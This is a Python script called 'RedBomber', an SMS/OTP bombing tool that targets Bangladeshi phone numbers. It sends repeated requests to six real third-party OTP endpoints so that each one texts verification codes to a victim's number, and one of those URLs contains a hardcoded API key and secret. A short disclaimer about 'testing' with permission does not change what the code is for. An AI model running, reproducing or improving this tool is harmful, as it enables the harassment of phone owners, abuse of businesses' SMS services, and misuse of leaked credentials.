import requests
from requests.structures import CaseInsensitiveDict
import time
import re
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored output
init()

# Color definitions
RED = Fore.RED
CYAN = Fore.CYAN
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RESET = Style.RESET_ALL

# ASCII logo and details
LOGO = GREEN + """
██████╗░███████╗██████╗░██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
██████╔╝█████╗░░██║░░██║██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══██╗██╔══╝░░██║░░██║██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██║░░██║███████╗██████╔╝██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
""" + RESET
LINE = YELLOW + "=" * 54 + RESET
TVERSION = CYAN + "\t\t   Version : 1.0.1 " + RESET
DTLS = YELLOW + "\t\t Created By: Redwiat " + RESET
NOTE = CYAN + "Note: For testing in Bangladesh only. Ensure you have permission to test on the target number." + RESET

# Print banner
print(LOGO)
print(DTLS)
print(TVERSION)
print(LINE)
print(NOTE)
print(LINE)
print()

# Validate Bangladesh phone number (e.g., +8801XXXXXXXXX or 01XXXXXXXXX)
def is_valid_bd_number(number):
    pattern = r"^(?:\+8801|01)[3-9]\d{8}$"
    return bool(re.match(pattern, number))

# API configurations
API_LIST = [
    {
        "url": "https://ss.binge.buzz/otp/send/login",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda num: f"phone={num}"
    },
    {
        "url": lambda num: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{num}&platform=app&activity=login",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Content-Length": "0"},
        "data": None
    },
    {
        "url": lambda num: f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{num}&operator=bd-otp",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "url": "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda num: f'{{"mobile":"{num}"}}'
    },
    {
        "url": "https://addabaji.mobi/twocups-v1-robi/otp.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda num: f"msisdn={num}"
    },
    {
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda num: f'{{"phone":"{num}","country_code":"+880","fcm_token":null}}'
    }
]

# Main function
def send_otp_requests(number, amount):
    print()
    for i in range(amount):
        print(f"{CYAN}Attempt {i+1}/{amount}:{RESET}")
        for api in API_LIST:
            try:
                url = api["url"](number) if callable(api["url"]) else api["url"]
                method = api["method"].lower()
                headers = CaseInsensitiveDict(api["headers"])
                data = api["data"](number) if api["data"] else None

                # Send request based on method
                if method == "post":
                    response = requests.post(url, headers=headers, data=data, timeout=10)
                elif method == "get":
                    response = requests.get(url, headers=headers, timeout=10)
                else:
                    print(f"  {RED}Unsupported method for {url}{RESET}")
                    continue

                # Check response status
                if response.status_code in [200, 201, 202]:
                    print(f"  {GREEN}SMS Sent to {url} ✅{RESET}")
                else:
                    print(f"  {RED}Failed to send SMS to {url} (Status: {response.status_code}){RESET}")

            except requests.RequestException as e:
                print(f"  {RED}Error sending to {url}: {str(e)}{RESET}")

            # Small delay to avoid overwhelming APIs
            time.sleep(0.5)

        # Delay between rounds
        time.sleep(1)

    print()
    print(CYAN + "\t\tTesting Complete. Thanks for using RedBomber!" + RESET)

# Input and validation
def main():
    try:
        number = input(RED + "[➙] Enter Your Number (e.g., +8801XXXXXXXXX or 01XXXXXXXXX): " + RESET)
        if not is_valid_bd_number(number):
            print(RED + "Invalid Bangladesh phone number! Must start with +8801 or 01 and be 11 digits." + RESET)
            return

        amount = input(CYAN + "[➙] Enter The Amount: " + RESET)
        if not amount.isdigit() or int(amount) <= 0:
            print(RED + "Amount must be a positive integer!" + RESET)
            return
        amount = int(amount)

        # Normalize number (remove +88 if present)
        if number.startswith("+88"):
            number = number[3:]

        send_otp_requests(number, amount)

    except KeyboardInterrupt:
        print(RED + "\nProcess interrupted by user." + RESET)
    except Exception as e:
        print(RED + f"An error occurred: {str(e)}" + RESET)

if __name__ == "__main__":
    # Check if requests is installed
    try:
        import requests
    except ImportError:
        print(RED + "The 'requests' module is not installed. Please install it using 'pip install requests'." + RESET)
        exit(1)

    main()
